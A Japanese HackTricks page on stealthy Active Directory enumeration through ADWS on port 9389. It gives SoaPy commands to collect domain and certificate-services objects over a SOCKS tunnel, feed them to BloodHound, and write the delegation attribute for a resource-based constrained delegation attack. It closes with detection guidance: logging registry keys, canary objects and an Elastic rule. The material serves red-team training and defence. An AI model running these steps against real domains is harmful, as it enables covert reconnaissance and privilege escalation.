# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWSとは？

Active Directory Web Services (ADWS)は、**Windows Server 2008 R2以降のすべてのドメインコントローラーでデフォルトで有効**になっており、TCP **9389**でリッスンしています。名前に反して、**HTTPは関与していません**。代わりに、このサービスは独自の.NETフレーミングプロトコルのスタックを介してLDAPスタイルのデータを公開します：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

トラフィックはこれらのバイナリSOAPフレーム内にカプセル化され、一般的でないポートを通過するため、**ADWSを介した列挙は、従来のLDAP/389および636トラフィックよりも検査、フィルタリング、または署名される可能性がはるかに低い**です。オペレーターにとって、これは意味します：

* ステルスな偵察 – ブルーチームはしばしばLDAPクエリに集中します。
* **非Windowsホスト（Linux、macOS）**から9389/TCPをSOCKSプロキシを介してトンネリングする自由。
* LDAPを介して取得するのと同じデータ（ユーザー、グループ、ACL、スキーマなど）と、**書き込み**を行う能力（例：**RBCD**のための`msDs-AllowedToActOnBehalfOfOtherIdentity`）。

> 注：ADWSは多くのRSAT GUI/PowerShellツールでも使用されるため、トラフィックは正当な管理者の活動と混在する可能性があります。

## SoaPy – ネイティブPythonクライアント

[SoaPy](https://github.com/logangoins/soapy)は、**純粋なPythonでのADWSプロトコルスタックの完全な再実装**です。NBFX/NBFSE/NNS/NMFフレームをバイト単位で作成し、.NETランタイムに触れることなくUnix系システムからの収集を可能にします。

### 主な機能

* **SOCKSを介したプロキシ**をサポート（C2インプラントから便利）。
* LDAPの`-q '(objectClass=user)'`と同じ細かい検索フィルター。
* オプションの**書き込み**操作（`--set` / `--delete`）。
* BloodHoundへの直接取り込みのための**BOFHound出力モード**。
* 人間の可読性が必要な場合にタイムスタンプや`userAccountControl`を整形するための`--parse`フラグ。

### インストール（オペレーターのホスト）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ステルスADコレクションワークフロー

以下のワークフローは、ADWSを介して**ドメインおよびADCSオブジェクト**を列挙し、それらをBloodHound JSONに変換し、証明書ベースの攻撃経路を追跡する方法を示しています - すべてLinuxから:

1. **ターゲットネットワークからあなたのボックスへの9389/TCPトンネル**（例：Chisel、Meterpreter、SSH動的ポートフォワードなど）。 `export HTTPS_PROXY=socks5://127.0.0.1:1080`をエクスポートするか、SoaPyの`--proxyHost/--proxyPort`を使用します。

2. **ルートドメインオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NCからADCS関連オブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHoundに変換:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIPをアップロード**し、BloodHound GUIで`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`のようなサイファークエリを実行して、証明書昇格パス（ESC1、ESC8など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)の記述
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
`s4u2proxy`/`Rubeus /getticket`を組み合わせて、完全な**リソースベースの制約付き委任**チェーンを作成します。

## 検出と強化

### 詳細なADDSログ記録

ドメインコントローラーで、ADWS（およびLDAP）からの高コスト/非効率的な検索を明らかにするために、次のレジストリキーを有効にします：
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
イベントは**Directory-Service**の下に表示され、完全なLDAPフィルターが表示されます。クエリがADWS経由で到着した場合でも同様です。

### SACLカナリアオブジェクト

1. ダミーオブジェクト（例：無効なユーザー`CanaryUser`）を作成します。
2. _Everyone_ プリンシパルに対して**Audit** ACEを追加し、**ReadProperty**で監査します。
3. 攻撃者が`(servicePrincipalName=*)`、`(objectClass=user)`などを実行するたびに、DCは**Event 4662**を発行し、実際のユーザーSIDを含みます。リクエストがプロキシされている場合やADWSから発信されている場合でも同様です。

Elasticの事前構築されたルールの例：
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## ツール概要

| 目的 | ツール | ノート |
|------|-------|-------|
| ADWS 列挙 | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, 読み書き |
| BloodHound 取り込み | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch ログを変換 |
| 証明書の妥協 | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS 経由でプロキシ可能 |

## 参考文献

* [SpecterOps – SOAP(y) を使用することを確認してください – ADWS を使用したステルスな AD コレクションのためのオペレーターガイド](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF 仕様](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
